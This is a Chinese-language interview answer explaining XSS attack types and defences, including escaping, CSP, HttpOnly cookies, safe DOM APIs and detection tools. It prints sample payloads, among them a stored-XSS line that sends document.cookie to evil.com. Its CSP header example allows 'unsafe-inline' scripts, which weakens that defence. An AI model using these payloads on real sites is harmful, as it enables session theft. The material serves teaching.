## 18. 什么是 XSS 攻击？如何防范？

**答案：**

### XSS 攻击简介

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者在网页中注入恶意脚本，当用户访问该页面时，恶意脚本会在用户的浏览器中执行。

### XSS 攻击类型

#### 1. 反射型 XSS（Reflected XSS）

**原理：** 攻击者构造包含恶意脚本的 URL，诱导用户点击，服务器将恶意脚本反射回用户浏览器执行。

```javascript
// 恶意 URL
http://example.com/search?q=<script>alert(document.cookie)</script>

// 服务器直接返回
<div>搜索结果：<script>alert(document.cookie)</script></div>
```

#### 2. 存储型 XSS（Stored XSS）

**原理：** 攻击者将恶意脚本存储到服务器数据库中，当其他用户访问包含该数据的页面时，恶意脚本被执行。

```javascript
// 攻击者在评论区提交恶意脚本
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

// 其他用户访问评论区时，恶意脚本被执行
```

#### 3. DOM 型 XSS（DOM-based XSS）

**原理：** 恶意脚本通过修改 DOM 而不是通过服务器反射，完全在客户端执行。

```javascript
// 恶意 URL
http://example.com/#<img src=x onerror=alert(document.cookie)>

// JavaScript 代码
const hash = decodeURIComponent(location.hash.substring(1));
document.getElementById('content').innerHTML = hash;
```

### XSS 攻击危害

1. **窃取 Cookie**：获取用户的登录凭证
2. **劫持会话**：冒充用户进行操作
3. **钓鱼攻击**：诱导用户输入敏感信息
4. **恶意操作**：篡改页面内容、执行恶意操作
5. **传播蠕虫**：自动传播恶意代码

### XSS 防范措施

#### 1. 输入验证和过滤

```javascript
// 过滤危险字符
function sanitizeInput(input) {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// 使用白名单
function sanitizeInput(input) {
  const whitelist = /^[a-zA-Z0-9\s\-_.,!?]+$/;
  return whitelist.test(input) ? input : '';
}
```

#### 2. 输出编码

```javascript
// HTML 编码
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// JavaScript 编码
function escapeJs(unsafe) {
  return unsafe
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');
}

// URL 编码
const encoded = encodeURIComponent(input);
```

#### 3. 使用 Content Security Policy（CSP）

```html
<!-- HTTP 响应头 -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com

<!-- 或者在 HTML 中 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

#### 4. HttpOnly Cookie

```javascript
// 设置 HttpOnly Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // 防止 JavaScript 访问
  secure: true,    // 只通过 HTTPS 传输
  sameSite: 'strict'  // 防止 CSRF 攻击
});
```

#### 5. 使用安全的 API

```javascript
// 不安全的 innerHTML
element.innerHTML = userInput;

// 安全的 textContent
element.textContent = userInput;

// 使用 DOMPurify 库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyInput);
```

#### 6. 验证 Content-Type

```javascript
// 设置正确的 Content-Type
res.setHeader('Content-Type', 'application/json');
res.setHeader('X-Content-Type-Options', 'nosniff');
```

### XSS 检测工具

1. **XSSer**：自动化的 XSS 检测工具
2. **OWASP ZAP**：Web 应用安全扫描器
3. **Burp Suite**：Web 安全测试工具

---